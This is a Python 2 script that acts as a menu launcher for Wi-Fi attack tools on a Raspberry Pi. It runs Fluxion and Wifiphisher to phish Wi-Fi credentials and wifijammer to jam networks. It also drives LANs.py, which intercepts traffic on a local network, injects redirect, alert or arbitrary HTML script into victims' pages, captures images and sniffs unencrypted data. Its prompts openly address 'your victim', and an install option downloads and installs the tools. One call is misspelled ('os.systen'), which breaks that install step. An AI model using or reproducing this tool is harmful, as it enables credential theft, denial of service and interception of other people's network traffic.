#!usr/bin/env python
#coding: utf-8

import os, sys

os.system('clear')

Hello = '''
╭━━━╮╱╭╮╭┳━━┳╮╱╭┳━┳━┳╮──▄▀▀▀▄
┃╭━╮┣┳┫╰╯┣╮╭┫┃╱┃┃╋┃╋┣┫──█───█
┃┃┃┃┣┃┫╭╮┃┃┃┃╰━╯┃╮┫╭┫┃─███████         ▄▀▀▄
┃┃┃┃┣┻┻╯╰╯╰╯╰━━╮┣┻┻╯╰╯░███▀███░░█▀█▀▀▀▀█░░█░
┃╰━╯┃ 0xHT4RPi ┃┃     ░███▄███░░▀░▀░░░░░▀▀░░
[!] 0x (\033[1;31mH\033[1;m)acking (\033[1;31mT\033[1;m)ools \033[1;31m4\033[1;m (\033[1;31mR\033[1;m)aspberry (\033[1;31mP\033[1;m)i
[~] Coded By \033[1;31mAbdullah AlZahrani\033[1;m [0xAbdullah]
[@] Twitter: \033[1;31m@0xAbdullah\033[1;m | WebSite: \033[1;31m0xA.TECH\033[1;m
\n'''
print Hello

if not os.geteuid() == 0:
    sys.exit("\n\033[1;31m[-] You don't have admin privilegies, execute the script as root.\n[@] sudo python 0xHT4RPi.py\033[1;m")

List = '''
1) Hacking WiFi
2) Jamming WiFi
3) Sniffing

99) Install/Update Tools
\n'''

print List
List = raw_input(" > ")
HWList = '''
1) Hacking Wifi With Fluxion [\033[1;31mNeed GUI\033[1;m]
2) Hacking Wifi With Wifiphisher
\n'''

SList = '''
1) Inject arbitrary HTML into pages
2) Capture images
3) Sniffing non-HTTPS data they send or request
\n'''

if List == '1':
    print HWList
    HWList = raw_input(" > ")
    if HWList == '1':
        os.system('cd 0xHT4RPi/fluxion && ./fluxion.sh')
    elif HWList == '2':
        os.system('cd 0xHT4RPi/wifiphisher && wifiphisher')
elif List == '2':
    QAttack = raw_input('[=] Do you want to exclude your network from attack Y/n: ')
    if QAttack == 'y' or QAttack == 'Y':
        MAC = os.system('nmcli -f SSID,BSSID,CHAN,SIGNAL dev wifi list')
        MAC = raw_input('\n[+] Enter MAC to exclude your network from attack\n > ')
        MAC = 'cd 0xHT4RPi/wifijammer && sudo python wifijammer.py -s %s' % (MAC)
        os.system(MAC)
    else:
        os.system('cd 0xHT4RPi/wifijammer && sudo python wifijammer.py')
elif List == '3':
    print SList
    SList = raw_input(" > ")
    if SList == '1':
        ExIndex = '''
1) Redirecting the victim to another Website
2) Inject alert Box
3) Inject Your HTML code
        \n'''
        print ExIndex
        ExIndex = raw_input(' > ')
        if ExIndex == '1':
            URL = raw_input("[-] Enter URL to redirecting the victim to another Website\n > ")
            Redirecting = "'""<script>window.location.replace("'"'+URL+'"'");</script>""'"
            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -c %s' % (Redirecting))
            os.system(Exploit)
        elif ExIndex == '2':
            Message = raw_input('[W] Write a message to your victim\n > ')
            Alert = "'""<script>alert("'"'+Message+'"'");</script>""'"
            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -c %s' % (Alert))
            os.system(Exploit)
        elif ExIndex == '3':
            HTML = raw_input("[*] Enter Your HTML Code\n > ")
            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -c %s' % (HTML))
            os.system(Exploit)
    elif SList == '2':
        Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -u -p -d')
        os.system(Exploit)
    elif SList == '3':
        Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -u -p')
        os.system(Exploit)
elif List == '99':
    QInstall = raw_input('[I] Do You Want To Install/Update Tools Y/n \n > ')
    if QInstall == 'y' or QInstall == 'Y':
        print "[I] Please Wait ... Downloading and installing the tools"
        os.system('mkdir 0xHT4RPi && cd 0xHT4RPi && git clone https://github.com/wifiphisher/wifiphisher.git && cd wifiphisher && python setup.py install')
        os.system('cd 0xHT4RPi && git clone https://github.com/wi-fi-analyzer/fluxion.git && cd fluxion/install && bash install.sh')
        os.system('cd 0xHT4RPi && git clone https://github.com/DanMcInerney/wifijammer.git')
        os.systen('cd 0xHT4RPi && git clone https://github.com/DanMcInerney/LANs.py.git')
        os.system('clear')
        print "[!] Done....."
        os.system("sudo python 0xHT4RPi.py")
    else:
        pass
